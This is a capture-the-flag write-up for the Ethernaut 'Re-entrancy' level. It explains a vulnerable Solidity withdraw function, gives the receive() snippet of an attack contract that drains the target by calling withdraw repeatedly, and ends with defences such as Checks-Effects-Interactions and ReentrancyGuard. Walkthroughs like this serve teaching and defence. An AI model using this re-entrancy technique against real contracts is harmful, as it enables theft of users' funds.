## Re-entrancy
The goal of this level is for you to steal all the funds from the contract.

##### Things that might help
Untrusted contracts can execute code where you least expect it.
Fallback methods
Throw/revert bubbling
Sometimes the best way to attack a contract is with another contract.

#### Understanding the contract
1. State Variables
```js
using SafeMath for uint256;
```
- This isn't a state variable, but its declaring that the ``SafeMath`` library is being used for ``uint256`` values. [SafeMath](https://docs.openzeppelin.com/contracts/2.x/api/math) is used for overflow checks
- importing the OpenZeppelin library allows for the use of ``SafeMath``
```js
import 'openzeppelin-contracts-06/math/SafeMath.sol';
```
- The contract has one state variable, ``balances``, which is public mapping that associates an address with a uint value
```js
mapping(address => uint) public balances;
```

2. Constructor
- This contract does not have a constructor

3. Functions
- This contract has three functions and a ``receive`` function which allows it to receive ether
```js
function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
}
```
- The ``donate`` function takes one arguments, an address ``_to``
- The function is ``public``, accessible to anyone
- The funciton is ``payable``, it can receive ether
- Using the safemath library, the balance of the address ``_to`` is updates in the ``balances`` mapping with the value sent in the ``donatate`` transaction

```js
function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
}
```
- The function ``balanceOf`` takes one argument, an address ``_who``
- The function is ``public``, accessible by anyone
- It is a ``view`` function, it doesn't change any state
- The functions returns a uint given the variable name of ``balance``
- The function uses the address that was input as a parameter, ``_who``, and returns that address's balance from the ``balances`` mapping

```js
function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
        (bool result,) = msg.sender.call{value:_amount}("");
        if(result) {
            _amount;
        }
        balances[msg.sender] -= _amount;
    }
}
```
- The ``withdraw`` function has one parameter, ``amount`` which is a uint
- The function is ``public``, so it can be called by anyone
- The functions checks to see if the address interacting with the withdraw function, ``msg.sender``, has an amount greater than or equal to the amount used as an argument for this function
- ``(bool result,) = msg.sender.call{value:_amount}("");`` is the standard syntax for using the ``call`` method... ``msg.sender`` is send the amount that was designated by the ``_amount`` paramter
- The second if statement doesn't seem to have much effect as it is simply checking if result is truthy... if so, then the if block seems to just have an expression of ``_amount``
- Finally, the ``balances`` mapping updates by subtracting the ``_amount`` value from the ``msg.sender`` address found in ``balances``

#### Solving
Solving this challenge involves exploiting the ``withdraw`` function
```js
if(balances[msg.sender] >= _amount) {
    (bool result,) = msg.sender.call{value:_amount}("");
    if(result) {
        _amount;
    }
    balances[msg.sender] -= _amount;
}
```
The function updates balances, after sending the amount
This can be exploited with a re-entrancy attack
Creating a separate contract that makes another withdraw call before the target contract updates balances will solve this challenge

```js
receive() external payable {
    if (address(target).balance >= msg.value) {
        target.withdraw(msg.value);
    }
}
```
When the attack contract receives ether, it will check if the target contract still has a balance... if it does, it will make another withdraw call before the target contract has a chance to update balances
Checking the balance before we run the attack will show how much eth is in the contract:

```js
await web3.eth.getBalance('0xdE1A4C547D3a2DbA1f2dBAeadef5488fa4eBfA0F') // 1000000000000000 wei
```
Sending that amount with the attack contract, should net us 1000000000000000 wei, or 0.001 eth

#### Summary
In order to prevent re-entrancy attacks when moving funds out of your contract, use the [Checks-Effects-Interactions pattern](https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern) being aware that call will only return false without interrupting the execution flow. Solutions such as [ReentrancyGuard](https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard) or [PullPayment](https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment) can also be used.

transfer and send are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork [Source 1](https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/) [Source 2](https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742).

Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.

Re-entrancy is a common attack. You should always be prepared for it!

**The DAO Hack**
The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See [15 lines of code that could have prevented TheDAO Hack](https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942).